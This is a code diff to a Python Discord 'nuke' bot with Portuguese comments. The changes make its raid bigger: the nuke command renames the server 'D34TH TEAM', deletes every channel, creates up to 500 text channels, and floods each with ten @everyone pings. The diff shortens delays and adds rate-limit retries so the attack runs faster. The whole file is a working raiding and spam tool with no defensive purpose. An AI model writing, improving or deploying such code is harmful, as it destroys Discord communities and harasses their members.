@@ -32,7 +32,6 @@ def run_flask():
 
 threading.Thread(target=run_flask, daemon=True).start()
 
-# Controle para evitar que o monitor apague canais durante o NUKE
 nuke_active = False
 
 def load_text():
@@ -109,7 +108,6 @@ async def on_command_error(ctx, error):
 
 @bot.event
 async def on_guild_channel_create(channel):
-    """Apaga qualquer canal criado automaticamente, exceto durante o NUKE"""
     global nuke_active
     if not nuke_active:
         try:
@@ -202,11 +200,13 @@ async def nuke(ctx):
         texto = load_text()
         guild = ctx.guild
         
+        # Renomear servidor
         try:
             await guild.edit(name="D34TH TEAM")
         except:
             pass
         
+        # Atualizar foto
         try:
             avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
             async with aiohttp.ClientSession() as session:
@@ -221,59 +221,68 @@ async def nuke(ctx):
             try:
                 if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                     await channel.delete()
-                    await asyncio.sleep(0.05)
+                    await asyncio.sleep(0.02)
             except:
                 pass
         
-        # Criar novos canais
+        # CRIAR 500 CANAIS DE TEXTO
         criados = 0
         canais = []
+        limite = 500
         
-        for i in range(50):
+        for i in range(limite):
             try:
                 canal = await guild.create_text_channel(f"d34th-{i+1}")
                 canais.append(canal)
                 criados += 1
-                await asyncio.sleep(0.03)
+                await asyncio.sleep(0.01)  # Delay minimo
+            except discord.errors.RateLimited:
+                await asyncio.sleep(1)
+                continue
             except:
-                pass
+                break
         
-        for i in range(20):
-            try:
-                canal = await guild.create_voice_channel(f"voice-{i+1}")
-                canais.append(canal)
-                criados += 1
-                await asyncio.sleep(0.03)
-            except:
-                pass
-        
-        for i in range(10):
-            try:
-                canal = await guild.create_forum_channel(f"forum-{i+1}")
-                canais.append(canal)
-                criados += 1
-                await asyncio.sleep(0.03)
-            except:
-                pass
-        
-        # Enviar mensagens
+        # ENVIAR MENSAGEM EM CADA CANAL COM @EVERYONE
         enviadas = 0
+        everyone = "@everyone " * 10
+        mensagem_base = f"{everyone}\n{texto}\nD34TH TEAM"
+        
         for canal in canais:
             if isinstance(canal, discord.TextChannel):
                 try:
-                    for i in range(10):
-                        msg = f"{texto}\nD34TH TEAM\n{i+1}/10"
-                        m = await canal.send(msg)
-                        for _ in range(5):
-                            await m.edit(content=glitch_text(msg, 3))
-                            await asyncio.sleep(0.2)
-                        await m.edit(content=msg)
-                        enviadas += 1
-                        await asyncio.sleep(0.03)
+                    # Envia com glitch rapido
+                    msg = await canal.send(mensagem_base)
+                    for _ in range(2):
+                        await msg.edit(content=glitch_text(mensagem_base, 3))
+                        await asyncio.sleep(0.1)
+                    await msg.edit(content=mensagem_base)
+                    enviadas += 1
+                    await asyncio.sleep(0.01)
                 except:
                     pass
         
-        embed = discord.Embed(title="NUKE COMPLETO", description=f"CANAIS: {criados}\nMENSAGENS: {enviadas}", color=discord.Color.dark_gray())
+        # CRIAR CANAIS DE VOZ E FORUM (EXTRA)
+        for i in range(20):
+            try:
+                await guild.create_voice_channel(f"voice-{i+1}")
+                criados += 1
+                await asyncio.sleep(0.01)
+            except:
+                break
+        
+        for i in range(10):
+            try:
+                await guild.create_forum_channel(f"forum-{i+1}")
+                criados += 1
+                await asyncio.sleep(0.01)
+            except:
+                break
+        
+        embed = discord.Embed(
+            title="NUKE COMPLETO", 
+            description=f"CANAIS CRIADOS: {criados}\nMENSAGENS ENVIADAS: {enviadas}\nTODOS OS CANAIS FORAM ATACADOS!",
+            color=discord.Color.dark_gray()
+        )
         if guild.text_channels:
             await guild.text_channels[0].send(embed=embed)
             
@@ -305,7 +314,7 @@ async def end(ctx):
                 if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                     await channel.delete()
                     count += 1
-                    await asyncio.sleep(0.05)
+                    await asyncio.sleep(0.02)
             except:
                 pass
         
@@ -365,16 +374,16 @@ async def set_text(ctx, *, texto):
 async def create_channels(ctx, quantidade: int = 10):
     try:
         await ctx.message.delete()
-        if quantidade > 50:
-            quantidade = 50
+        if quantidade > 500:
+            quantidade = 500
         criados = 0
         for i in range(quantidade):
             try:
                 await ctx.guild.create_text_channel(f"channel-{i+1}")
                 criados += 1
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.02)
             except:
-                pass
+                break
         embed = discord.Embed(title="CRIADOS", description=f"{criados} canais", color=discord.Color.dark_gray())
         await ctx.send(embed=embed, delete_after=5)
     except Exception as e:
